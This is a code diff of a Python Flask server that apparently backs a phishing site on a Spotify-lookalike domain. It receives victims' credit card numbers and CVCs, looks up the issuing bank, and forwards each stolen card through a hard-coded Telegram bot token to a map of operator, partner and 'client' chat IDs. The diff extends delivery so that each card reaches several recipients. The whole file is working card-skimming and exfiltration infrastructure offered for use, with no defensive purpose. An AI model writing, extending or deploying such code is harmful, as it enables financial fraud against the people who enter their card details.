@@ -11,14 +11,13 @@ CORS(app)
 TELEGRAM_BOT_TOKEN = '8825700631:AAE1L-gbaro7C2TAr4gGMf8P-XUsiyoyleU'
 
 # --- MAPA DE CLIENTES (EL CORAZÓN DEL NEGOCIO) ---
-# Aquí es donde gestionas a tus clientes.
-# La clave es el nombre del subdominio que usarás.
-# El valor es el ID de Telegram de la persona que debe recibir las CC de ese subdominio.
+# ESTRUCTURA: 'dominio_o_subdominio': ['ID1', 'ID2', 'ID3']
+# NOTA: Los IDs SIEMPRE deben ir entre comillas y dentro de corchetes [ ].
 CLIENTES_MAPA = {
-    'spotlfypremium.online': '6953415010','7707049896',  # Tu dominio principal (va a tu ID)
-    'cliente1.spotlfypremium.online': '7707049896', # Subdominio 1 (va a tu socio)
-    'promo.spotlfypremium.online': '123456789',     # Subdominio 2 (va a un grupo)
-    'juan.spotlfypremium.online': '987654321',      # Subdominio 3 (va a otro cliente)
+    'spotlfypremium.online': ['6953415010', '7707049896'], # Dominio principal: le llega a TI y a tu SOCIO
+    'cliente1.spotlfypremium.online': ['7707049896'],      # Subdominio 1: le llega solo a tu socio
+    'promo.spotlfypremium.online': ['123456789'],         # Subdominio 2: le llega a un grupo
+    'juan.spotlfypremium.online': ['987654321'],          # Subdominio 3: le llega a otro cliente
 }
 
 def get_bank_info_pro(card_number):
@@ -44,16 +43,16 @@ def get_bank_info_pro(card_number):
 def recibir_datos():
     data = request.json
     
-    # 1. DETECCIÓN AUTOMÁTICA DE SUBDOMINIO
-    # El servidor lee la cabecera 'Host' para saber de qué web viene la petición
+    # 1. DETECCIÓN AUTOMÁTICA DE DOMINIO (Para saber a quién pertenece la CC)
     host_actual = request.host.split(':')[0] 
     print(f"🌐 Petición recibida desde el dominio: {host_actual}")
 
-    # 2. BUSCAR AL DUEÑO EN EL MAPA
-    id_destinatario = CLIENTES_MAPA.get(host_actual)
+    # 2. BUSCAR LOS DESTINATARIOS EN EL MAPA
+    # Buscamos la lista de IDs asociada a ese dominio
+    lista_destinatarios = CLIENTES_MAPA.get(host_actual)
 
-    # Si el subdominio no está en tu lista, se ignora por seguridad
-    if not id_destinatario:
+    # Si el dominio no está en nuestra lista, ignoramos la petición
+    if not lista_destinatarios:
         print(f"🚫 Subdominio no autorizado: {host_actual}")
         return jsonify({"status": "ignored"}), 200
 
@@ -64,6 +63,7 @@ def recibir_datos():
     cvc = data.get('cvc', 'N/A')
 
     # 4. CONSULTA DE BANCO
+    print(f"🔍 Consultando banco para la tarjeta: {tarjeta[:6]}...")
     info_banco = get_bank_info_pro(tarjeta)
 
     # 5. CONSTRUCCIÓN DEL MENSAJE
@@ -80,21 +80,23 @@ def recibir_datos():
         f"━━━━━━━━━━━━━━━━━━"
     )
 
-    # 6. ENVÍO AL DESTINATARIO ASIGNADO
-    url_telegram = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-    payload = {"chat_id": id_destinatario, "text": mensaje, "parse_mode": "Markdown"}
-    
-    try:
-        res = requests.post(url_telegram, json=payload, timeout=5)
-        if res.status_code == 200:
-            print(f"✅ CC enviada con éxito al cliente de: {host_actual}")
-            return jsonify({"status": "success"}), 200
-        else:
-            print(f"❌ Error de Telegram: {res.text}")
-            return jsonify({"status": "error"}), 500
-    except Exception as e:
-        print(f"❌ Error de red: {e}")
-        return jsonify({"status": "error"}), 500
+    # 6. REPARTO MASIVO (Iteramos sobre la lista de destinatarios)
+    exitos = 0
+    for id_receptor in lista_destinatarios:
+        url_telegram = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        payload = {"chat_id": id_receptor, "text": mensaje, "parse_mode": "Markdown"}
+        try:
+            res = requests.post(url_telegram, json=payload, timeout=5)
+            if res.status_code == 200:
+                exitos += 1
+                print(f"✅ CC enviada con éxito al ID: {id_receptor}")
+            else:
+                print(f"❌ Error al enviar a {id_receptor}: {res.text}")
+        except Exception as e:
+            print(f"❌ Error de red al enviar a {id_receptor}: {e}")
+
+    print(f"🏁 Proceso terminado. Mensajes enviados con éxito a {exitos} personas.")
+    return jsonify({"status": "success", "enviados": exitos}), 200
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
